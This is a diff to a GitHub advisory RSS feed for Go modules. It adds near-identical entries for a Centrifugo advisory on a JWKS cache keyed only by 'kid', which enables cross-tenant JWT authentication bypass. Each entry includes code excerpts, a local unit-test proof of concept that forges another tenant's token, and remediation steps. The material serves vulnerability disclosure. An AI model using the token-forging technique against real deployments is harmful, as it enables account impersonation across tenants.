@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-01T19:30:58.592Z</updated>
+    <updated>2026-07-01T20:31:54.922Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,1211 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/centrifugal/centrifugo] Centrifugo's dynamic JWKS key cache keyed only by `kid` allows cross-issuer JWT authentication bypass]]></title>
+        <id>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</id>
+        <link href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj"/>
+        <updated>2026-07-01T20:28:55.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
+<p>Centrifugo's dynamic JWKS endpoint feature can verify a JWT for one allowed issuer using a public key cached from another allowed issuer. The JWKS cache and <code>singleflight</code> lookup are keyed only by the JWT header <code>kid</code>, not by the resolved JWKS endpoint, issuer, audience, or other trust-domain namespace.</p>
+<p>In a documented multi-issuer dynamic JWKS configuration, an attacker who can obtain or mint a valid token for issuer/tenant A can authenticate as issuer/tenant B if both JWKS documents use the same <code>kid</code> value and tenant A's key is cached first. This affects connection token verification and subscription token verification because both paths use the same JWKS verification manager.</p>
+<h4 id="details">Details</h4>
+<p>The vulnerable path is reachable when either of these shipped configuration options is set to a templated JWKS URL using values derived from JWT <code>iss</code> or <code>aud</code> claims:</p>
+<ul>
+<li><code>client.token.jwks_public_endpoint</code></li>
+<li><code>client.subscription_token.jwks_public_endpoint</code></li>
+</ul>
+<p>Relevant shipped config fields are defined in <code>internal/configtypes/types.go:59-65</code>, mapped into verifier configuration in <code>internal/confighelpers/jwt.go:36-41</code>, and exposed in the generated config schema at <code>internal/cli/configdoc/schema.json:3927</code>, <code>3947</code>, <code>3967</code>, <code>3987</code>, <code>4069</code>, <code>4089</code>, <code>4109</code>, and <code>4129</code>. Dynamic JWKS endpoints based on <code>iss</code> and <code>aud</code> are documented in the project changelog at <code>CHANGELOG.md:107</code>.</p>
+<p>External clients control JWT connection and subscription tokens:</p>
+<ul>
+<li>Connection tokens reach <code>VerifyConnectToken</code> from <code>internal/client/handler.go:350-352</code>.</li>
+<li>Normal subscription tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:769-775</code>.</li>
+<li>Subscription refresh tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:628-632</code>.</li>
+</ul>
+<p>The verifier must parse token claims before signature verification to resolve the dynamic JWKS endpoint:</p>
+<ul>
+<li><code>VerifyConnectToken</code> parses without verification at <code>internal/jwtverify/token_verifier_jwt.go:528-535</code>, extracts template variables before signature verification at <code>internal/jwtverify/token_verifier_jwt.go:539-548</code>, then validates claims only after signature verification at <code>internal/jwtverify/token_verifier_jwt.go:557-560</code>.</li>
+<li><code>VerifySubscribeToken</code> follows the same pattern at <code>internal/jwtverify/token_verifier_jwt.go:700-732</code>.</li>
+</ul>
+<p>The problem is that the JWKS cache lookup ignores the endpoint/trust domain selected by those token variables. <code>internal/jwtverify/token_verifier_jwt.go:242-245</code> passes only the JWT header <code>kid</code> plus token-derived variables to the JWKS manager:</p>
+<pre><code class="language-go">func (j *jwksManager) verify(token *jwt.Token, tokenVars map[string]any) error {
+    kid := token.Header().KeyID
+
+    key, err := j.Manager.FetchKey(context.Background(), kid, tokenVars)
+</code></pre>
+<p><code>internal/jwks/manager.go:96-117</code> checks cache and <code>singleflight</code> using only <code>kid</code>:</p>
+<pre><code class="language-go">func (m *Manager) FetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    if kid == "" {
+        return nil, ErrKeyIDNotProvided
+    }
+
+    if m.useCache {
+        key, err := m.cache.Get(kid)
+        if err == nil {
+            return key, nil
+        }
+    }
+
+    v, err, _ := m.group.Do(kid, func() (any, error) {
+        return m.fetchKey(ctx, kid, tokenVars)
+    })
+</code></pre>
+<p>The resolved JWKS URL is computed only later in <code>internal/jwks/manager.go:133-149</code>:</p>
+<pre><code class="language-go">func (m *Manager) fetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    jwkURL := m.url.ExecuteString(tokenVars)
+    ...
+    req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwkURL, nil)
+</code></pre>
+<p>The TTL cache also stores and retrieves keys only by <code>kid</code> at <code>internal/jwks/cache_ttl.go:82-101</code>:</p>
+<pre><code class="language-go">func (tc *TTLCache) Add(key *JWK) error {
+    ...
+    tc.items[key.Kid] = item
+}
+
+func (tc *TTLCache) Get(kid string) (*JWK, error) {
+    ...
+    item, ok := tc.items[kid]
+</code></pre>
+<p>As a result, a key fetched from tenant A's JWKS endpoint can be reused to verify a token claiming tenant B before tenant B's JWKS endpoint is consulted.</p>
+<p>I also reviewed the template safety mitigation in <code>internal/jwtverify/validate.go:99-154</code>. It restricts placeholder regex groups to finite literal alternatives, which helps prevent arbitrary endpoint substitution, but it does not scope cached keys by the resolved endpoint or issuer/audience namespace. The PoC uses a validator-accepted issuer regex: <code>^(?P&lt;tenant&gt;tenant-a|tenant-b)$</code>.</p>
+<h4 id="poc">PoC</h4>
+<p>This is a safe local-only unit test using <code>httptest.Server</code> and generated RSA key pairs. It does not contact external systems.</p>
+<p>From a clean checkout of <code>centrifugal/centrifugo</code> at commit <code>458ee0500f046877d7e8375e32f5e842bc95535b</code>, add this file as <code>internal/jwtverify/jwks_cache_poc_test.go</code>:</p>
+<pre><code class="language-go">package jwtverify
+
+import (
+    "crypto/rsa"
+    "encoding/json"
+    "net/http"
+    "net/http/httptest"
+    "sync/atomic"
+    "testing"
+    "time"
+
+    "github.com/centrifugal/centrifugo/v6/internal/config"
+
+    "github.com/cristalhq/jwt/v5"
+    "github.com/stretchr/testify/require"
+)
+
+func writeRSAJWKS(t *testing.T, w http.ResponseWriter, pubKey *rsa.PublicKey, kid string) {
+    t.Helper()
+    resp := map[string]any{
+        "keys": []map[string]string{
+            {
+                "alg": "RS256",
+                "kty": "RSA",
+                "use": "sig",
+                "kid": kid,
+                "n":   encodeToString(pubKey.N.Bytes()),
+                "e":   encodeUint64ToString(uint64(pubKey.E)),
+            },
+        },
+    }
+    w.Header().Set("Content-Type", "application/json")
+    require.NoError(t, json.NewEncoder(w).Encode(resp))
+}
+
+func getRSAIssuerConnToken(t *testing.T, user string, issuer string, rsaPrivateKey *rsa.PrivateKey, kid string) string {
+    t.Helper()
+    signer, err := jwt.NewSignerRS(jwt.RS256, rsaPrivateKey)
+    require.NoError(t, err)
+    builder := jwt.NewBuilder(signer, jwt.WithKeyID(kid))
+    claims := &amp;ConnectTokenClaims{
+        Base64Info: "e30=",
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   user,
+            Issuer:    issuer,
+            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
+        },
+    }
+    token, err := builder.Build(claims)
+    require.NoError(t, err)
+    return token.String()
+}
+
+func TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC(t *testing.T) {
+    const kid = "shared-kid"
+
+    tenantAPrivateKey, tenantAPublicKey := generateTestRSAKeys(t)
+    tenantBPrivateKey, tenantBPublicKey := generateTestRSAKeys(t)
+
+    var tenantARequests int32
+    var tenantBRequests int32
+
+    ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        switch r.URL.Path {
+        case "/tenant-a/jwks.json":
+            atomic.AddInt32(&amp;tenantARequests, 1)
+            writeRSAJWKS(t, w, tenantAPublicKey, kid)
+        case "/tenant-b/jwks.json":
+            atomic.AddInt32(&amp;tenantBRequests, 1)
+            writeRSAJWKS(t, w, tenantBPublicKey, kid)
+        default:
+            http.NotFound(w, r)
+        }
+    }))
+    defer ts.Close()
+
+    cfg := config.DefaultConfig()
+    cfgContainer, err := config.NewContainer(cfg)
+    require.NoError(t, err)
+
+    newVerifier := func() *VerifierJWT {
+        verifier, err := NewTokenVerifierJWT(VerifierConfig{
+            JWKSPublicEndpoint: ts.URL + "/{{tenant}}/jwks.json",
+            IssuerRegex:        `^(?P&lt;tenant&gt;tenant-a|tenant-b)$`,
+        }, cfgContainer)
+        require.NoError(t, err)
+        return verifier
+    }
+
+    legitimateTenantAToken := getRSAIssuerConnToken(t, "tenant-a-user", "tenant-a", tenantAPrivateKey, kid)
+    legitimateTenantBToken := getRSAIssuerConnToken(t, "tenant-b-user", "tenant-b", tenantBPrivateKey, kid)
+    forgedTenantBToken := getRSAIssuerConnToken(t, "victim", "tenant-b", tenantAPrivateKey, kid)
+
+    ct, err := newVerifier().VerifyConnectToken(legitimateTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-b-user", ct.UserID)
+
+    _, err = newVerifier().VerifyConnectToken(forgedTenantBToken, false)
+    require.Error(t, err)
+
+    verifier := newVerifier()
+    ct, err = verifier.VerifyConnectToken(legitimateTenantAToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-a-user", ct.UserID)
+
+    tenantBRequestsBeforeForge := atomic.LoadInt32(&amp;tenantBRequests)
+    ct, err = verifier.VerifyConnectToken(forgedTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "victim", ct.UserID)
+    require.Equal(t, tenantBRequestsBeforeForge, atomic.LoadInt32(&amp;tenantBRequests))
+}
+</code></pre>
+<p>Run the focused test with the project-supported Go toolchain:</p>
+<pre><code class="language-bash">go test ./internal/jwtverify -run TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC -count=1 -v
+</code></pre>
+<p>Observed vulnerable output in my local test environment using Go 1.26.3:</p>
+<pre><code class="language-text">=== RUN   TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+--- PASS: TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC (0.07s)
+PASS
+ok  	github.com/centrifugal/centrifugo/v6/internal/jwtverify	0.088s
+</code></pre>
+<p>The passing test demonstrates the vulnerable behavior because it asserts these controls:</p>
+<ol>
+<li>A legitimate tenant-B token signed by tenant B succeeds with a fresh verifier.</li>
+<li>A forged tenant-B token signed by tenant A fails with a fresh verifier.</li>
+<li>A legitimate tenant-A token succeeds and primes the JWKS cache with tenant A's <code>shared-kid</code> key.</li>
+<li>The forged tenant-B token signed by tenant A then succeeds with user ID <code>victim</code>.</li>
+<li>The tenant-B JWKS request counter does not increase during forged verification, proving the forged token was accepted from the cross-tenant cache hit rather than from tenant B's JWKS endpoint.</li>
+</ol>
+<p>Expected behavior after a fix: the forged tenant-B token should remain rejected after tenant A primes the cache, or the verifier should fetch/consult tenant B's independent JWKS cache namespace before verification.</p>
+<h4 id="impact">Impact</h4>
+<p>This is a cross-issuer / cross-tenant JWT authentication bypass in dynamic JWKS deployments.</p>
+<p>Impacted deployments are those that use dynamic JWKS endpoint templates to select different JWKS URLs for different allowed issuers or audiences, for example multi-tenant deployments using <code>{{tenant}}</code> values extracted from <code>iss</code> or <code>aud</code>.</p>
+<p>An attacker who can obtain or mint a valid token for one allowed issuer/tenant can authenticate as another allowed issuer/tenant if both JWKS documents use the same <code>kid</code> value and the attacker's issuer key is cached first. <code>kid</code> values are not globally unique by specification and are often operational labels such as <code>current</code>, <code>default</code>, or rotation identifiers, so the verifier should not rely on <code>kid</code> uniqueness across different JWKS trust domains.</p>
+<p>Potential consequences include:</p>
+<ul>
+<li>Authentication as a user in another issuer/tenant namespace.</li>
+<li>Unauthorized connection-token acceptance.</li>
+<li>Unauthorized subscription-token acceptance where separate subscription JWTs are configured.</li>
+<li>Cross-tenant confidentiality and integrity impact when issuer-derived JWKS endpoints are used as separate trust domains.</li>
+</ul>
+<h4 id="suggested-remediation">Suggested remediation</h4>
+<p>Scope JWKS cache entries and <code>singleflight</code> keys to the resolved JWKS trust domain, not only to the JWT <code>kid</code>.</p>
+<p>For dynamic endpoints, compute the endpoint namespace before cache lookup and use a composite cache key such as:</p>
+<pre><code class="language-text">resolved_jwks_url + "\x00" + kid
+</code></pre>
+<p>or an equivalent canonical trust-domain identifier plus <code>kid</code>.</p>
+<p>The same composite namespace should be used for:</p>
+<ul>
+<li>TTL cache lookup.</li>
+<li>TTL cache storage.</li>
+<li><code>singleflight.Group.Do</code> keys.</li>
+</ul>
+<p>A regression test should prime tenant A's cache and then verify that a forged tenant-B token signed by tenant A remains rejected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T20:28:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/centrifugal/centrifugo/v3] Centrifugo's dynamic JWKS key cache keyed only by `kid` allows cross-issuer JWT authentication bypass]]></title>
+        <id>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</id>
+        <link href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj"/>
+        <updated>2026-07-01T20:28:55.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
+<p>Centrifugo's dynamic JWKS endpoint feature can verify a JWT for one allowed issuer using a public key cached from another allowed issuer. The JWKS cache and <code>singleflight</code> lookup are keyed only by the JWT header <code>kid</code>, not by the resolved JWKS endpoint, issuer, audience, or other trust-domain namespace.</p>
+<p>In a documented multi-issuer dynamic JWKS configuration, an attacker who can obtain or mint a valid token for issuer/tenant A can authenticate as issuer/tenant B if both JWKS documents use the same <code>kid</code> value and tenant A's key is cached first. This affects connection token verification and subscription token verification because both paths use the same JWKS verification manager.</p>
+<h4 id="details">Details</h4>
+<p>The vulnerable path is reachable when either of these shipped configuration options is set to a templated JWKS URL using values derived from JWT <code>iss</code> or <code>aud</code> claims:</p>
+<ul>
+<li><code>client.token.jwks_public_endpoint</code></li>
+<li><code>client.subscription_token.jwks_public_endpoint</code></li>
+</ul>
+<p>Relevant shipped config fields are defined in <code>internal/configtypes/types.go:59-65</code>, mapped into verifier configuration in <code>internal/confighelpers/jwt.go:36-41</code>, and exposed in the generated config schema at <code>internal/cli/configdoc/schema.json:3927</code>, <code>3947</code>, <code>3967</code>, <code>3987</code>, <code>4069</code>, <code>4089</code>, <code>4109</code>, and <code>4129</code>. Dynamic JWKS endpoints based on <code>iss</code> and <code>aud</code> are documented in the project changelog at <code>CHANGELOG.md:107</code>.</p>
+<p>External clients control JWT connection and subscription tokens:</p>
+<ul>
+<li>Connection tokens reach <code>VerifyConnectToken</code> from <code>internal/client/handler.go:350-352</code>.</li>
+<li>Normal subscription tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:769-775</code>.</li>
+<li>Subscription refresh tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:628-632</code>.</li>
+</ul>
+<p>The verifier must parse token claims before signature verification to resolve the dynamic JWKS endpoint:</p>
+<ul>
+<li><code>VerifyConnectToken</code> parses without verification at <code>internal/jwtverify/token_verifier_jwt.go:528-535</code>, extracts template variables before signature verification at <code>internal/jwtverify/token_verifier_jwt.go:539-548</code>, then validates claims only after signature verification at <code>internal/jwtverify/token_verifier_jwt.go:557-560</code>.</li>
+<li><code>VerifySubscribeToken</code> follows the same pattern at <code>internal/jwtverify/token_verifier_jwt.go:700-732</code>.</li>
+</ul>
+<p>The problem is that the JWKS cache lookup ignores the endpoint/trust domain selected by those token variables. <code>internal/jwtverify/token_verifier_jwt.go:242-245</code> passes only the JWT header <code>kid</code> plus token-derived variables to the JWKS manager:</p>
+<pre><code class="language-go">func (j *jwksManager) verify(token *jwt.Token, tokenVars map[string]any) error {
+    kid := token.Header().KeyID
+
+    key, err := j.Manager.FetchKey(context.Background(), kid, tokenVars)
+</code></pre>
+<p><code>internal/jwks/manager.go:96-117</code> checks cache and <code>singleflight</code> using only <code>kid</code>:</p>
+<pre><code class="language-go">func (m *Manager) FetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    if kid == "" {
+        return nil, ErrKeyIDNotProvided
+    }
+
+    if m.useCache {
+        key, err := m.cache.Get(kid)
+        if err == nil {
+            return key, nil
+        }
+    }
+
+    v, err, _ := m.group.Do(kid, func() (any, error) {
+        return m.fetchKey(ctx, kid, tokenVars)
+    })
+</code></pre>
+<p>The resolved JWKS URL is computed only later in <code>internal/jwks/manager.go:133-149</code>:</p>
+<pre><code class="language-go">func (m *Manager) fetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    jwkURL := m.url.ExecuteString(tokenVars)
+    ...
+    req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwkURL, nil)
+</code></pre>
+<p>The TTL cache also stores and retrieves keys only by <code>kid</code> at <code>internal/jwks/cache_ttl.go:82-101</code>:</p>
+<pre><code class="language-go">func (tc *TTLCache) Add(key *JWK) error {
+    ...
+    tc.items[key.Kid] = item
+}
+
+func (tc *TTLCache) Get(kid string) (*JWK, error) {
+    ...
+    item, ok := tc.items[kid]
+</code></pre>
+<p>As a result, a key fetched from tenant A's JWKS endpoint can be reused to verify a token claiming tenant B before tenant B's JWKS endpoint is consulted.</p>
+<p>I also reviewed the template safety mitigation in <code>internal/jwtverify/validate.go:99-154</code>. It restricts placeholder regex groups to finite literal alternatives, which helps prevent arbitrary endpoint substitution, but it does not scope cached keys by the resolved endpoint or issuer/audience namespace. The PoC uses a validator-accepted issuer regex: <code>^(?P&lt;tenant&gt;tenant-a|tenant-b)$</code>.</p>
+<h4 id="poc">PoC</h4>
+<p>This is a safe local-only unit test using <code>httptest.Server</code> and generated RSA key pairs. It does not contact external systems.</p>
+<p>From a clean checkout of <code>centrifugal/centrifugo</code> at commit <code>458ee0500f046877d7e8375e32f5e842bc95535b</code>, add this file as <code>internal/jwtverify/jwks_cache_poc_test.go</code>:</p>
+<pre><code class="language-go">package jwtverify
+
+import (
+    "crypto/rsa"
+    "encoding/json"
+    "net/http"
+    "net/http/httptest"
+    "sync/atomic"
+    "testing"
+    "time"
+
+    "github.com/centrifugal/centrifugo/v6/internal/config"
+
+    "github.com/cristalhq/jwt/v5"
+    "github.com/stretchr/testify/require"
+)
+
+func writeRSAJWKS(t *testing.T, w http.ResponseWriter, pubKey *rsa.PublicKey, kid string) {
+    t.Helper()
+    resp := map[string]any{
+        "keys": []map[string]string{
+            {
+                "alg": "RS256",
+                "kty": "RSA",
+                "use": "sig",
+                "kid": kid,
+                "n":   encodeToString(pubKey.N.Bytes()),
+                "e":   encodeUint64ToString(uint64(pubKey.E)),
+            },
+        },
+    }
+    w.Header().Set("Content-Type", "application/json")
+    require.NoError(t, json.NewEncoder(w).Encode(resp))
+}
+
+func getRSAIssuerConnToken(t *testing.T, user string, issuer string, rsaPrivateKey *rsa.PrivateKey, kid string) string {
+    t.Helper()
+    signer, err := jwt.NewSignerRS(jwt.RS256, rsaPrivateKey)
+    require.NoError(t, err)
+    builder := jwt.NewBuilder(signer, jwt.WithKeyID(kid))
+    claims := &amp;ConnectTokenClaims{
+        Base64Info: "e30=",
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   user,
+            Issuer:    issuer,
+            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
+        },
+    }
+    token, err := builder.Build(claims)
+    require.NoError(t, err)
+    return token.String()
+}
+
+func TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC(t *testing.T) {
+    const kid = "shared-kid"
+
+    tenantAPrivateKey, tenantAPublicKey := generateTestRSAKeys(t)
+    tenantBPrivateKey, tenantBPublicKey := generateTestRSAKeys(t)
+
+    var tenantARequests int32
+    var tenantBRequests int32
+
+    ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        switch r.URL.Path {
+        case "/tenant-a/jwks.json":
+            atomic.AddInt32(&amp;tenantARequests, 1)
+            writeRSAJWKS(t, w, tenantAPublicKey, kid)
+        case "/tenant-b/jwks.json":
+            atomic.AddInt32(&amp;tenantBRequests, 1)
+            writeRSAJWKS(t, w, tenantBPublicKey, kid)
+        default:
+            http.NotFound(w, r)
+        }
+    }))
+    defer ts.Close()
+
+    cfg := config.DefaultConfig()
+    cfgContainer, err := config.NewContainer(cfg)
+    require.NoError(t, err)
+
+    newVerifier := func() *VerifierJWT {
+        verifier, err := NewTokenVerifierJWT(VerifierConfig{
+            JWKSPublicEndpoint: ts.URL + "/{{tenant}}/jwks.json",
+            IssuerRegex:        `^(?P&lt;tenant&gt;tenant-a|tenant-b)$`,
+        }, cfgContainer)
+        require.NoError(t, err)
+        return verifier
+    }
+
+    legitimateTenantAToken := getRSAIssuerConnToken(t, "tenant-a-user", "tenant-a", tenantAPrivateKey, kid)
+    legitimateTenantBToken := getRSAIssuerConnToken(t, "tenant-b-user", "tenant-b", tenantBPrivateKey, kid)
+    forgedTenantBToken := getRSAIssuerConnToken(t, "victim", "tenant-b", tenantAPrivateKey, kid)
+
+    ct, err := newVerifier().VerifyConnectToken(legitimateTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-b-user", ct.UserID)
+
+    _, err = newVerifier().VerifyConnectToken(forgedTenantBToken, false)
+    require.Error(t, err)
+
+    verifier := newVerifier()
+    ct, err = verifier.VerifyConnectToken(legitimateTenantAToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-a-user", ct.UserID)
+
+    tenantBRequestsBeforeForge := atomic.LoadInt32(&amp;tenantBRequests)
+    ct, err = verifier.VerifyConnectToken(forgedTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "victim", ct.UserID)
+    require.Equal(t, tenantBRequestsBeforeForge, atomic.LoadInt32(&amp;tenantBRequests))
+}
+</code></pre>
+<p>Run the focused test with the project-supported Go toolchain:</p>
+<pre><code class="language-bash">go test ./internal/jwtverify -run TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC -count=1 -v
+</code></pre>
+<p>Observed vulnerable output in my local test environment using Go 1.26.3:</p>
+<pre><code class="language-text">=== RUN   TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+--- PASS: TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC (0.07s)
+PASS
+ok  	github.com/centrifugal/centrifugo/v6/internal/jwtverify	0.088s
+</code></pre>
+<p>The passing test demonstrates the vulnerable behavior because it asserts these controls:</p>
+<ol>
+<li>A legitimate tenant-B token signed by tenant B succeeds with a fresh verifier.</li>
+<li>A forged tenant-B token signed by tenant A fails with a fresh verifier.</li>
+<li>A legitimate tenant-A token succeeds and primes the JWKS cache with tenant A's <code>shared-kid</code> key.</li>
+<li>The forged tenant-B token signed by tenant A then succeeds with user ID <code>victim</code>.</li>
+<li>The tenant-B JWKS request counter does not increase during forged verification, proving the forged token was accepted from the cross-tenant cache hit rather than from tenant B's JWKS endpoint.</li>
+</ol>
+<p>Expected behavior after a fix: the forged tenant-B token should remain rejected after tenant A primes the cache, or the verifier should fetch/consult tenant B's independent JWKS cache namespace before verification.</p>
+<h4 id="impact">Impact</h4>
+<p>This is a cross-issuer / cross-tenant JWT authentication bypass in dynamic JWKS deployments.</p>
+<p>Impacted deployments are those that use dynamic JWKS endpoint templates to select different JWKS URLs for different allowed issuers or audiences, for example multi-tenant deployments using <code>{{tenant}}</code> values extracted from <code>iss</code> or <code>aud</code>.</p>
+<p>An attacker who can obtain or mint a valid token for one allowed issuer/tenant can authenticate as another allowed issuer/tenant if both JWKS documents use the same <code>kid</code> value and the attacker's issuer key is cached first. <code>kid</code> values are not globally unique by specification and are often operational labels such as <code>current</code>, <code>default</code>, or rotation identifiers, so the verifier should not rely on <code>kid</code> uniqueness across different JWKS trust domains.</p>
+<p>Potential consequences include:</p>
+<ul>
+<li>Authentication as a user in another issuer/tenant namespace.</li>
+<li>Unauthorized connection-token acceptance.</li>
+<li>Unauthorized subscription-token acceptance where separate subscription JWTs are configured.</li>
+<li>Cross-tenant confidentiality and integrity impact when issuer-derived JWKS endpoints are used as separate trust domains.</li>
+</ul>
+<h4 id="suggested-remediation">Suggested remediation</h4>
+<p>Scope JWKS cache entries and <code>singleflight</code> keys to the resolved JWKS trust domain, not only to the JWT <code>kid</code>.</p>
+<p>For dynamic endpoints, compute the endpoint namespace before cache lookup and use a composite cache key such as:</p>
+<pre><code class="language-text">resolved_jwks_url + "\x00" + kid
+</code></pre>
+<p>or an equivalent canonical trust-domain identifier plus <code>kid</code>.</p>
+<p>The same composite namespace should be used for:</p>
+<ul>
+<li>TTL cache lookup.</li>
+<li>TTL cache storage.</li>
+<li><code>singleflight.Group.Do</code> keys.</li>
+</ul>
+<p>A regression test should prime tenant A's cache and then verify that a forged tenant-B token signed by tenant A remains rejected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T20:28:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/centrifugal/centrifugo/v4] Centrifugo's dynamic JWKS key cache keyed only by `kid` allows cross-issuer JWT authentication bypass]]></title>
+        <id>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</id>
+        <link href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj"/>
+        <updated>2026-07-01T20:28:55.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
+<p>Centrifugo's dynamic JWKS endpoint feature can verify a JWT for one allowed issuer using a public key cached from another allowed issuer. The JWKS cache and <code>singleflight</code> lookup are keyed only by the JWT header <code>kid</code>, not by the resolved JWKS endpoint, issuer, audience, or other trust-domain namespace.</p>
+<p>In a documented multi-issuer dynamic JWKS configuration, an attacker who can obtain or mint a valid token for issuer/tenant A can authenticate as issuer/tenant B if both JWKS documents use the same <code>kid</code> value and tenant A's key is cached first. This affects connection token verification and subscription token verification because both paths use the same JWKS verification manager.</p>
+<h4 id="details">Details</h4>
+<p>The vulnerable path is reachable when either of these shipped configuration options is set to a templated JWKS URL using values derived from JWT <code>iss</code> or <code>aud</code> claims:</p>
+<ul>
+<li><code>client.token.jwks_public_endpoint</code></li>
+<li><code>client.subscription_token.jwks_public_endpoint</code></li>
+</ul>
+<p>Relevant shipped config fields are defined in <code>internal/configtypes/types.go:59-65</code>, mapped into verifier configuration in <code>internal/confighelpers/jwt.go:36-41</code>, and exposed in the generated config schema at <code>internal/cli/configdoc/schema.json:3927</code>, <code>3947</code>, <code>3967</code>, <code>3987</code>, <code>4069</code>, <code>4089</code>, <code>4109</code>, and <code>4129</code>. Dynamic JWKS endpoints based on <code>iss</code> and <code>aud</code> are documented in the project changelog at <code>CHANGELOG.md:107</code>.</p>
+<p>External clients control JWT connection and subscription tokens:</p>
+<ul>
+<li>Connection tokens reach <code>VerifyConnectToken</code> from <code>internal/client/handler.go:350-352</code>.</li>
+<li>Normal subscription tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:769-775</code>.</li>
+<li>Subscription refresh tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:628-632</code>.</li>
+</ul>
+<p>The verifier must parse token claims before signature verification to resolve the dynamic JWKS endpoint:</p>
+<ul>
+<li><code>VerifyConnectToken</code> parses without verification at <code>internal/jwtverify/token_verifier_jwt.go:528-535</code>, extracts template variables before signature verification at <code>internal/jwtverify/token_verifier_jwt.go:539-548</code>, then validates claims only after signature verification at <code>internal/jwtverify/token_verifier_jwt.go:557-560</code>.</li>
+<li><code>VerifySubscribeToken</code> follows the same pattern at <code>internal/jwtverify/token_verifier_jwt.go:700-732</code>.</li>
+</ul>
